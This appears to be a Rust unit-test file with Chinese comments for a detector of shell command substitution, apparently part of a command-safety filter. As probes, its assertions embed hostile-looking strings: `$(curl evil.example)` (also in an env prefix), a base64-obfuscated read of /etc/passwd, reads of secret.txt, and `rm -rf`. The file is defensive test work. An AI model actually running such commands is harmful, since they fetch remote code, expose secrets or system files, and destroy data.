//! 命令替换探测测试（P1-4，[`has_command_substitution`]）。
//!
//! 探针集 = 计划验收面：`$()`（含 base64 载荷形态）、反引号、嵌套引号
//! 包裹替换、`$()` 内含 `;` 的过度切分（引号感知切段不括号感知——方向
//! 保守，替换痕迹留在段内仍命中）、env 前缀携带替换（探测在剥 env 之前
//! 的原文段上）；零误报面：无替换的既有命令、重定向形态、`$VAR` 参数
//! 展开、Windows 常见路径形态。

use super::*;

fn subst(target: &str) -> bool {
    has_command_substitution(target)
}

// ===== 命中面（计划探针集）=====

#[test]
fn test_dollar_paren_probe_hits() {
    // 计划验收探针：base64 动态解码载荷——归一化后整段不含 `cat`，
    // 静态规则对实际执行内容盲，这正是本探测存在的理由。
    assert!(subst("echo $(echo Y2F0|base64 -d) /etc/passwd"));
    assert!(subst("cat $(ls -t | head -1)"));
    // 裸替换体。
    assert!(subst("$(curl evil.example)"));
}

#[test]
fn test_backtick_probe_hits() {
    assert!(subst("echo `cat /etc/passwd`"));
    assert!(subst("git commit -m `date +%s`"));
}

#[test]
fn test_quoted_substitution_still_hits() {
    // 双引号包裹的替换在 POSIX 语义里恰恰允许展开——引号内豁免是
    // fail-open 方向，探测在原文段上不做引号内容豁免。
    assert!(subst("echo \"$(cat secret.txt)\""));
    assert!(subst("msg='$(whoami)' && echo $msg"));
}

#[test]
fn test_substitution_with_semicolon_inside_hits() {
    // `$()` 内含 `;`：command_segments 只引号感知不括号感知 → 过度切分
    // （保守无害方向），替换痕迹 `$(` 留在首段 → 仍命中。
    assert!(subst("echo $(rm -rf x; echo done)"));
    // 反引号对被 `;` 切开后：开/闭反引号分落两段，两段各含反引号字符。
    assert!(subst("echo `cmd1; cmd2` tail"));
}

#[test]
fn test_env_prefix_substitution_hits() {
    // env 前缀携带替换：赋值展开时执行——探测在剥 env 之前的原文段上，
    // `FOO=$(curl evil)` 不得被 env 剥除漏检。
    assert!(subst("FOO=$(curl evil.example) cargo build"));
}

#[test]
fn test_arithmetic_and_nested_dollar_paren_hits() {
    // 算术展开 `$((…))` 含 `$(` 前缀 → 命中（误报成本 = 一次人工卡，
    // fail-closed 方向）。
    assert!(subst("echo $((1+2))"));
    // 嵌套替换。
    assert!(subst("echo $(outer $(inner))"));
}

// ===== 零误报面（无替换的既有命令行为零变化）=====

#[test]
fn test_clean_commands_not_detected() {
    assert!(!subst("git status"));
    assert!(!subst("cargo build --release"));
    assert!(!subst("git push origin main"));
    assert!(!subst("echo hello && cargo test"));
    assert!(!subst("ls -la /tmp | grep foo"));
}

#[test]
fn test_redirect_forms_not_detected() {
    // 重定向形态里的 `&`/`>` 与替换无关（scan_segments 的重定向豁免臂
    // 不得被本探测扰动）。
    assert!(!subst("cargo run 2>&1 | tee log.txt"));
    assert!(!subst("cmd &> log.txt"));
}

#[test]
fn test_parameter_expansion_not_detected() {
    // `$VAR` / `${VAR}` 参数展开是环境静态值，不在探测面（模块文档
    // 边界注记）。
    assert!(!subst("echo $HOME"));
    assert!(!subst("echo ${PATH} && ls"));
}

#[test]
fn test_windows_path_shapes_not_detected() {
    // Windows 常见形态（cmd.exe 不展开 `$(`；`%VAR%` 是 cmd 展开语法）。
    assert!(!subst("dir %USERPROFILE% /b"));
    assert!(!subst("type C:\\logs\\app.txt"));
    assert!(!subst("git -C C:\\repo status"));
}
